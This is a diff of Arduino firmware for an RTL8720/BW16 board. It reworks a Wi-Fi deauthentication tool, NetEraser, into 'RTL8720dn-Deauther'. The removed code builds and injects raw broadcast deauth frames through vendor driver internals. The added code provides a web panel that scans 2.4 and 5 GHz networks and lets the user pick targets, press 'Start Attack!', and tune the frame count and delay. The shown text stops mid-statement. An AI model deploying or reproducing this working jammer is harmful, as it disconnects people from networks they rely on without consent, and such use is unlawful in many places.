@@ -1,24 +1,22 @@
-/*
- * NetEraser
- * A tool that deauthenticates 2.4GHz and 5GHz Wi-Fi networks using BW16.
- * Author - WireBits
- */
+#undef max
+#include "vector"
+#include "wifi_conf.h"
+#include "map"
+#include "src/packet-injection/packet-injection.h"
+#include "wifi_util.h"
+#include "wifi_structures.h"
+#include "debug.h"
+#include "WiFi.h"
+#include "WiFiServer.h"
+#include "WiFiClient.h"
 
-#include <map>
-#include <vector>
-#include <WiFi.h>
-#include <wifi_conf.h>
-#include <wifi_util.h>
-#include <WiFiClient.h>
-#include <WiFiServer.h>
-#include <wifi_structures.h>
+void handleRoot(WiFiClient &client);
+void handle404(WiFiClient &client);
 
-#define FRAMES_PER_DEAUTH 5
-
-extern uint8_t* rltk_wlan_info;
-extern "C" void* alloc_mgtxmitframe(void* ptr);
-extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
-extern "C" int dump_mgntframe(void* ptr, void* frame_control);
+// LEDs:
+//  Red: System usable, Web server active etc.
+//  Green: Web Server communication happening
+//  Blue: Deauth-Frame being sent
 
 typedef struct {
   String ssid;
@@ -28,84 +26,24 @@ typedef struct {
   uint8_t channel;
 } WiFiScanResult;
 
-typedef struct {
-  uint16_t frame_control = 0xC0;
-  uint16_t duration = 0xFFFF;
-  uint8_t destination[6];
-  uint8_t source[6];
-  uint8_t access_point[6];
-  const uint16_t sequence_number = 0;
-  uint16_t reason = 0x06;
-} DeauthFrame;
-
-char *ssid = "NetEraser";
-char *pass = "neteraser";
+char *ssid = "RTL8720dn-Deauther";
+char *pass = "0123456789";
 
 int current_channel = 1;
 std::vector<WiFiScanResult> scan_results;
-std::vector<int> deauth_wifis;
+std::map<int, std::vector<int>> deauth_channels;
+std::vector<int> chs_idx;
+uint32_t current_ch_idx = 0;
+uint32_t sent_frames = 0;
+
 WiFiServer server(80);
 uint8_t deauth_bssid[6];
 uint16_t deauth_reason = 2;
 
-int scanNetworks() {
-  scan_results.clear();
-  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
-    delay(5000);
-    return 0;
-  } else {
-    return 1;
-  }
-}
-
-String parseRequest(String request) {
-  int path_start = request.indexOf(' ') + 1;
-  int path_end = request.indexOf(' ', path_start);
-  return request.substring(path_start, path_end);
-}
-
-String makeResponse(int code, String content_type) {
-  String response = "HTTP/1.1 " + String(code) + " OK\n";
-  response += "Content-Type: " + content_type + "\n";
-  response += "Connection: close\n\n";
-  return response;
-}
-
-String makeRedirect(String url) {
-  String response = "HTTP/1.1 307 Temporary Redirect\n";
-  response += "Location: " + url;
-  return response;
-}
-
-void handle404(WiFiClient &client) {
-  String response = makeResponse(404, "text/plain");
-  response += "Not found!";
-  client.write(response.c_str());
-}
-
-void sendWifiRawManagementFrames(void* frame, size_t length) {
-  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
-  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);
-
-  if (frame_control != 0) {
-    update_mgntframe_attrib(ptr, frame_control + 8);
-    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
-    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
-    memcpy(frame_data, frame, length);
-    *(uint32_t *)(frame_control + 0x14) = length;
-    *(uint32_t *)(frame_control + 0x18) = length;
-    dump_mgntframe(ptr, frame_control);
-  }
-}
-
-void sendDeauthenticationFrames(void* src_mac, void* dst_mac, uint16_t reason) {
-  DeauthFrame frame;
-  memcpy(&frame.source, src_mac, 6);
-  memcpy(&frame.access_point, src_mac, 6);
-  memcpy(&frame.destination, dst_mac, 6);
-  frame.reason = reason;
-  sendWifiRawManagementFrames(&frame, sizeof(DeauthFrame));
-}
+int frames_per_deauth = 5;
+int send_delay = 5;
+bool isDeauthing = false;
+bool led = true;
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
@@ -125,27 +63,60 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   return RTW_SUCCESS;
 }
 
-std::vector<std::pair<String, String>> parsePost(String &request){
+int scanNetworks() {
+  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
+  scan_results.clear();
+  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
+    delay(5000);
+    DEBUG_SER_PRINT(" done!\n");
+    return 0;
+  } else {
+    DEBUG_SER_PRINT(" failed!\n");
+    return 1;
+  }
+}
+
+String parseRequest(String request) {
+  int path_start = request.indexOf(' ');
+  if (path_start < 0) return "/";
+  path_start += 1;
+  int path_end = request.indexOf(' ', path_start);
+  if (path_end < 0) return "/";
+  return request.substring(path_start, path_end);
+}
+
+std::vector<std::pair<String, String>> parsePost(String &request) {
     std::vector<std::pair<String, String>> post_params;
+
+    // Find the start of the body
     int body_start = request.indexOf("\r\n\r\n");
     if (body_start == -1) {
-        return post_params;
+        return post_params; // Return an empty vector if no body found
     }
     body_start += 4;
+
+    // Extract the POST data
     String post_data = request.substring(body_start);
+
     int start = 0;
     int end = post_data.indexOf('&', start);
+
+    // Loop through the key-value pairs
     while (end != -1) {
         String key_value_pair = post_data.substring(start, end);
         int delimiter_position = key_value_pair.indexOf('=');
+
         if (delimiter_position != -1) {
             String key = key_value_pair.substring(0, delimiter_position);
             String value = key_value_pair.substring(delimiter_position + 1);
-            post_params.push_back({key, value});
+            post_params.push_back({key, value}); // Add the key-value pair to the vector
         }
+
         start = end + 1;
         end = post_data.indexOf('&', start);
     }
+
+    // Handle the last key-value pair
     String key_value_pair = post_data.substring(start);
     int delimiter_position = key_value_pair.indexOf('=');
     if (delimiter_position != -1) {
@@ -153,7 +124,21 @@ std::vector<std::pair<String, String>> parsePost(String &request){
         String value = key_value_pair.substring(delimiter_position + 1);
         post_params.push_back({key, value});
     }
+
     return post_params;
+}
+
+String makeResponse(int code, String content_type) {
+  String response = "HTTP/1.1 " + String(code) + " OK\n";
+  response += "Content-Type: " + content_type + "\n";
+  response += "Connection: close\n\n";
+  return response;
+}
+
+String makeRedirect(String url) {
+  String response = "HTTP/1.1 307 Temporary Redirect\n";
+  response += "Location: " + url;
+  return response;
 }
 
 void handleRoot(WiFiClient &client) {
@@ -161,119 +146,557 @@ void handleRoot(WiFiClient &client) {
   <!DOCTYPE html>
   <html lang="en">
   <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>NetEraser</title>
-      <style>
-        body{background-color: #000000; color: white; text-align: center; font-family: Arial, sans-serif;}
-        h1{font-size: 1.4rem;margin-bottom: 10px;padding: 10px;border: 2px solid #FFC72C;font-weight: 100;letter-spacing: 5px;background-color: #000000;color: white;display: inline-block;}
-        table{width: 80%; margin: auto; border-collapse: collapse; border: 2px solid #87CEEB; margin-bottom: 20px;}
-        th,td{border: 1px solid #87CEEB; padding: 12px; text-align: center;}
-        th{background-color: #000000;}
-        form{background-color: black;padding: 20px;border-radius: 5px;box-shadow: 0 2px 5px rgba(0,0,0,0.1);margin-bottom: 20px;width: 100%;}
-        input[type="submit"]{background-color: #00AB66;color: white;border: none;padding: 15px 30px;font-size: 20px;cursor: pointer;border-radius: 5px;display: block;margin: 20px auto;text-align: center;width: 200px;}
-        input[type="submit"]:hover{background-color: #00AB66;}
-      </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
+    <meta name="theme-color" content="#36393E">
+    <title>RTL8720dn-Deauther</title>
+    <style>
+    /* Base on Spacehuhn css file. Copyright (c) 2020 Spacehuhn Technologies: https://github.com/spacehuhntech/esp8266_deauther */
+      body {
+        background: #36393e;
+        color: #bfbfbf;
+        font-family: sans-serif;
+      }
+
+      h3{
+        background: #2f3136;
+        color: #bfbfbb;
+        padding: .2em 1em;
+        border-radius: 3px;
+        // border-left: solid #20c20e 5px;
+        font-weight: 100;
+        text-align: center;
+        width: 50%;
+      }
+
+      .centered{
+        display: flex;
+        justify-content: center;
+      }
+      h1 {
+        font-size: 1.7rem;
+        margin-top: 1rem;
+        background: #2f3136;
+        color: #bfbfbb;
+        padding: .2em 1em;
+        border-radius: 3px;
+        border-left: solid #20c20e 5px;
+        border-right: solid #20c20e 5px;
+        font-weight: 100;
+        text-align: center;
+      }
+
+      h2 {
+        font-size: 1.1rem;
+        margin-top: 1rem;
+        background: #2f3136;
+        color: #bfbfbb;
+        padding: .4em 1em;
+        border-radius: 3px;
+        border-left: solid #20c20e 5px;
+        font-weight: 100;
+      }
+
+      table {
+        border-collapse: collapse;
+        width: 100%;
+        min-width: auto;
+        margin-bottom: 2em;
+      }
+
+      td {
+        word-break: keep-all;
+        // padding: 10px 6px;
+        text-align: left;
+        border-bottom: 1px solid #5d5d5d;
+      }
+      
+      .tdMeter {
+        word-break: break-all;
+        // padding: 10px 6px;
+        padding-right: 10px;
+        text-align: left;
+        border-bottom: 1px solid #5d5d5d;
+      }
+
+      .tdFixed{
+        word-break: keep-all;
+        padding: 10px 6px;
+        text-align: center;
+        border-bottom: 1px solid #5d5d5d;
+      }
+
+      th {
+          word-break: break-word;
+          // padding: 10px 6px;
+          text-align: left;
+          border-bottom: 1px solid #5d5d5d;
+      }
+
+      p {
+        margin: .5em 0;
+      }
+      .bold {
+        font-weight: bold;
+      }
+
+      .right {
+        display: flex;
+        flex-direction: row-reverse;
+      }
+
+      .container {
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+      }
+
+      .checkBoxContainer {
+        display: block;
+        position: relative;
+        padding-left: 25px;
+        margin-bottom: 12px;
+        cursor: pointer;
+        font-size: 22px;
+        user-select: none;
+        height: 32px;
+      }
+
+      .checkBoxContainer input {
+        position: absolute;
+        opacity: 0;
+        cursor: pointer;
+      }
+
+      .checkmark {
+        position: absolute;
+        top: 8px;
+        left: 0;
+        height: 28px;
+        width: 28px;
+        background-color: #2F3136;
+        border-radius: 4px;
+      }
+
+      .checkmark:after {
+        content: "";
+        position: absolute;
+        display: none;
+      }
+
+      .checkBoxContainer input:checked ~ .checkmark:after {
+        display: block;
+      }
+
+      .checkBoxContainer .checkmark:after {
+        left: 10px;
+        top: 7px;
+        width: 4px;
+        height: 10px;
+        border: solid white;
+        border-width: 0 3px 3px 0;
+        transform: rotate(45deg);
+      }
+              /* Meter */
+      .meter_background{
+        background: #42464D;
+        // width: 100%;
+        word-break: normal;
+        // min-width: 100px;
+        // min-width: 45px;
+      }
+      .meter_forground{
+        color: #fff;
+        padding: 4px 0;
+        /* + one of the colors below
+        (width will be set by the JS) */
+      }
+      .meter_green{
+        background: #43B581;
+      }
+      .meter_orange{
+        background: #FAA61A;
+      }
+      .meter_red{
+        background: #F04747;
+      }
+      .meter_value{
+        padding-left: 8px;
+      }
+
+      @keyframes fadeIn {
+        0% {
+            opacity: 0;
+        }
+        100% {
+            opacity: 1;
+        }
+      }
+
+      hr {
+        background: #3e4146;
+      }
+      
+      .button-container {
+        display: flex; /* Usar flexbox */
+        justify-content: start; /* Espacio entre los botones */
+        align-items: center; /* Centra los elementos horizontalmente */
+        align-content: center;
+        column-gap: 15px;
+      }
+
+      .button-double{
+        display: flex; /* Usar flexbox */
+        flex-direction: column;
+        justify-content: start; /* Espacio entre los botones */
+        align-items: center; /* Centra los elementos horizontalmente */
+        align-content: center;
+        row-gap: 15px;
+      }
+
+      .upload-script,
+      .button,
+      button,
+      input[type=submit],
+      input[type=reset],
+      input[type=button] {
+        display: inline-block;
+        height: 38px;
+        // padding: 0 20px;
+        color: #fff;
+        text-align: center;
+        font-size: 11px;
+        font-weight: 600;
+        line-height: 38px;
+        letter-spacing: .1rem;
+        text-transform: uppercase;
+        text-decoration: none;
+        white-space: nowrap;
+        background: #2f3136;
+        border-radius: 4px;
+        border: 0;
+        cursor: pointer;
+        box-sizing: border-box;
+      }
+
+      button:hover,
+      input[type=submit]:hover,
+      input[type=reset]:hover,
+      input[type=button]:hover {
+        background: #42444a;
+      }
+
+      button:active,
+      input[type=submit]:active,
+      input[type=reset]:active,
+      input[type=button]:active {
+        transform: scale(.93);
+      }
+
+      button:disabled:hover,
+      input[type=submit]:disabled:hover,
+      input[type=reset]:disabled:hover,
+      input[type=button]:disabled:hover {
+        background: white;
+        cursor: not-allowed;
+        opacity: .40;
+        filter: alpha(opacity=40);
+        transform: scale(1);
+      }
+
+      button::-moz-focus-inner {
+        border: 0;
+      }
+
+      input[type=email],
+      input[type=number],
+      input[type=search],
+      input[type=text],
+      input[type=tel],
+      input[type=url],
+      input[type=password],
+      textarea,
+      select {
+        text-align: center;
+        height: 38px;
+        padding: 0 5px;
+      }
+
+      .shortInput{
+        width: 28px;
+      }
+
+      .longInput{
+        width: 138px;
+      }
+    </style>
   </head>
   <body>
-      <h1>NetEraser</h1>
+  <div class="container">
+    <h1 class="bold">RTL8720dn-Deauther</h1>
+      <div class="right">
+        <div class="button-container">
+          <form method="post" action="/rescan">
+              <input type="submit" value="Rescan Network">
+          </form>
+          <form method="post" action="/refresh">
+              <input type="submit" value="Refresh page">
+          </form>
+        </div>
+      </div>
       <form method="post" action="/deauth">
-          <table>
-              <tr>
-                  <th>Number</th>
-                  <th>SSID</th>
-                  <th>BSSID</th>
-                  <th>Channel</th>
-                  <th>RSSI</th>
-                  <th>Frequency</th>
-                  <th>Select</th>
-              </tr>
+      <h2>Access Points: )" + String(scan_results.size()) + R"(</h2>
+      <div class="centered">
+        <h3 class="bold">5 GHz networks</h3>  
+      </div>
+        <table>
+          <tr>
+            <th>SSID</th>
+            <th class='tdFixed'>CH</th>
+            <th>BSSID</th>
+            <th>RSSI</th>
+            <th class='tdFixed'></th>
+            <th class='selectColumn'></th>
+          </tr>
   )";
 
   for (uint32_t i = 0; i < scan_results.size(); i++) {
-    response += "<tr>";
-    response += "<td>" + String(i) + "</td>";
-    response += "<td>" + scan_results[i].ssid + "</td>";
-    response += "<td>" + scan_results[i].bssid_str + "</td>";
-    response += "<td>" + String(scan_results[i].channel) + "</td>";
-    response += "<td>" + String(scan_results[i].rssi) + "</td>";
-    response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
-    response += "<td><input type='radio' name='network' value='" + String(i) + "'></td>";
-    response += "</tr>";
-  }
+    if (scan_results[i].channel >= 36) {
+      String color = "";
+      int width = scan_results[i].rssi + 120;
+      int colorWidth = scan_results[i].rssi + 130;
 
+      if (colorWidth < 50) color = "meter_red";
+      else if (colorWidth < 70) color = "meter_orange";
+      else color = "meter_green";
+
+      response += "<tr>";
+      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
+      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
+      response += "<td>" + scan_results[i].bssid_str + "</td>";
+      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
+      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
+      response += "</tr>";
+    }
+  }
   response += R"(
         </table>
-          <input type="submit" value="Start">
+        <div class="centered">
+          <h3 class="bold">2.4 GHz networks</h3>  
+        </div>
+          <table>
+            <tr>
+              <th>SSID</th>
+              <th class='tdFixed'>CH</th>
+              <th>BSSID</th>
+              <th>RSSI</th>
+              <th class='tdFixed'></th>
+              <th class='selectColumn'></th>
+            </tr>
+  )";
+
+  for (uint32_t i = 0; i < scan_results.size(); i++) {
+    if (scan_results[i].channel <= 14) {
+      String color = "";
+      int width = scan_results[i].rssi + 120;
+      int colorWidth = scan_results[i].rssi + 130;
+
+      if (colorWidth < 50) color = "meter_red";
+      else if (colorWidth < 70) color = "meter_orange";
+      else color = "meter_green";
+      
+      response += "<tr>";
+      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
+      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
+      response += "<td>" + scan_results[i].bssid_str + "</td>";
+      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
+      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
+      response += "</tr>";
+    }
+  }
+  response += R"(
+        </table>
+            <div class="right">
+              <div class="button-container">
+                <input type="submit" value="Start Attack!">  
+              </div>
+            </div>
       </form>
+      <div class="right">
+        <form method="post" action="/stop">
+          <div class="button-container">
+            <input type="submit" value="Stop">
+          </div>
+        </form>
+      </div>
+      <h2>Dashboard</h2>
+    <table>
+      <tr><th>State</th><th>Current Value</th></tr>
+  )";
+  response += "<tr><td>Status Attack</td><td>" + String(isDeauthing ? "Running" : "Stopped") + "</th></tr>";
+  response += "<tr><td>LED Enabled</td><td>" + String(led ? "Yes" : "No") + "</th></tr>";
+  response += "<tr><td>Frame Sent</td><td>" + String(sent_frames) + "</th></tr>";
+  response += "<tr><td>Send Delay</td><td>" + String(send_delay) + "</th></tr>";
+  response += "<tr><td>Number of frames send each time</td><td>" + String(frames_per_deauth) + "</th></tr>";
+  response += "</table>";
+  response += R"(
+    <h2>Setup</h2>
+      <div class="right">
+        <div class="button-double">
+          <form method="post" action="/setframes">
+            <div class="button-container">
+              <input class="longInput" type="text" name="frames" placeholder="Number of frames">
+              <input type="submit" value="Set frames">
+            </div>
+          </form>
+
+          <form method="post" action="/setdelay">
+            <div class="button-container">
+              <input class="longInput" type="text" name="delay" placeholder="Send frames delay">
+              <input type="submit" value="Set delay  ">
+            </div>
+          </form>
+        </div>
+      </div>
+    <h2>LED Options</h2>
+      <div class="right">
+        <div class="button-container">
+          <form method="post" action="/led_enable">
+              <input class="green" type="submit" value="Turn on LED">
+          </form>
+
+          <form method="post" action="/led_disable">
+              <input class="red" type="submit" value="Turn off LED">
+          </form>
+        </div>
+      </div>
+  </div>
   </body>
   </html>
   )";
 
   client.write(response.c_str());
 }
+
+void handle404(WiFiClient &client) {
+  String response = makeResponse(404, "text/plain");
+  response += "Not found!";
+  client.write(response.c_str());
+}
+
 void setup() {
   pinMode(LED_R, OUTPUT);
   pinMode(LED_G, OUTPUT);
   pinMode(LED_B, OUTPUT);
-  IPAddress localip(192, 168, 4, 1);
-  IPAddress gateway(192, 168, 4, 1);
-  IPAddress subnet(255, 255, 255, 0);
-  WiFi.config(localip, gateway, subnet);
+
+  DEBUG_SER_INIT();
   WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
-  if (scanNetworks()){
-    delay(1000);
+
+  scanNetworks();
+
+#ifdef DEBUG
+  for (uint i = 0; i < scan_results.size(); i++) {
+    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
+    for (int j = 0; j < 6; j++) {
+      if (j > 0) DEBUG_SER_PRINT(":");
+      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
+    }
+    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
+    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
   }
+#endif
+
   server.begin();
-  digitalWrite(LED_R, LOW);
-  digitalWrite(LED_G, HIGH);
+
+  if (led) {
+    digitalWrite(LED_R, HIGH);
+  }
 }
 
 void loop() {
   WiFiClient client = server.available();
   if (client.connected()) {
-    digitalWrite(LED_G, HIGH);
+    if (led) {
+      digitalWrite(LED_G, HIGH);
+    }
     String request;
     while (client.available()) {
-      while (client.available()) request += (char)client.read();
-      delay(1);
+      request += (char)client.read();
     }
+    DEBUG_SER_PRINT(request);
     String path = parseRequest(request);
+    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");
 
     if (path == "/") {
       handleRoot(client);
     } else if (path == "/rescan") {
       client.write(makeRedirect("/").c_str());
-      while (scanNetworks()) {
-        delay(1000);
-      }
+      scanNetworks();
     } else if (path == "/deauth") {
       std::vector<std::pair<String, String>> post_data = parsePost(request);
-      if (post_data.size() >= 1) {
-        for (auto &param : post_data) {
-          if (param.first == "network") {
-            deauth_wifis.push_back(String(param.second).toInt());
-          }
+      deauth_channels.clear();
+      chs_idx.clear();
+      for (auto &param : post_data) {
+        if (param.first == "network") {
+          int idx = String(param.second).toInt();
+          int ch = scan_results[idx].channel;
+          deauth_channels[ch].push_back(idx);
+          chs_idx.push_back(ch);
+        } else if (param.first == "reason") {
+          deauth_reason = String(param.second).toInt();
         }
       }
+      if (!deauth_channels.empty()) {
+        isDeauthing = true;
+      }
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/setframes") {
+      std::vector<std::pair<String, String>> post_data = parsePost(request);
+      for (auto &param : post_data) {
+        if (param.first == "frames") {
+          int frames = String(param.second).toInt();
+          frames_per_deauth = frames <= 0 ? 5 : frames;
+        }
+      }
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/setdelay") {
+      std::vector<std::pair<String, String>> post_data = parsePost(request);
+      for (auto &param : post_data) {
+        if (param.first == "delay") {
+          int delay = String(param.second).toInt();
+          send_delay = delay <= 0 ? 5 : delay;
+        }
+      }
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/stop") {
+      deauth_channels.clear();
+      chs_idx.clear();
+      isDeauthing = false;
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/led_enable") {
+      led = true;
+      digitalWrite(LED_R, HIGH);
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/led_disable") {
+      led = false;
+      digitalWrite(LED_R, LOW);
+      digitalWrite(LED_G, LOW);
+      digitalWrite(LED_B, LOW);
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/refresh") {
+      client.write(makeRedirect("/").c_str());
     } else {
       handle404(client);
     }
+
     client.stop();
-    digitalWrite(LED_G, LOW);
-  }
-  uint32_t current_num = 0;
-  while (deauth_wifis.size() > 0) {
-    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
-    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
-    current_num++;
-    if (current_num >= deauth_wifis.size()) current_num = 0;
-    digitalWrite(LED_R, HIGH);
-    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-      sendDeauthenticationFrames(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
-      delay(5);
+    if (led) {
+      digitalWrite(LED_G, LOW);
     }
-    digitalWrite(LED_R, LOW);
-    delay(50);
   }
-}
+  
+  if (isDeauthing && !deauth_channels.empty()) {
+    for (auto& group : deauth_channels) {
+      int ch = group.first;
+      if (ch == chs_idx[current_ch_idx]) {
+        wex
